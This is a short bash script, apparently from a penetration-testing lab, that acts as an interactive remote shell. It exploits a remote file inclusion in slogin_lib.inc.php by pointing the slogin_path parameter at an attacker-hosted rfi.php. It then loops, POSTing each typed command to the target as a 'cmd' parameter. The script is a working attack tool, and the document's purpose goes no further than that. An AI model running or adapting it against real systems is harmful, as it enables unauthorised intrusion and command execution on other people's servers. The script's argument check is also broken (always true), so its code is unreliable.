#!/bin/bash
#http://10.10.10.67/webdav_test_inception/s.php

if [ $1='' ]; then
	url='http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111//slogin_lib.inc.php?slogin_path=http://10.11.0.245/rfi.php'
else 
	url=$1
fi

echo [*] Using: $url

while true; do
read -p "spotshell#: " cmd
ncmd=`echo $cmd | sed 's/ /\+/'`
curl -d "cmd=$cmd" $url -X POST 2>&1
done;
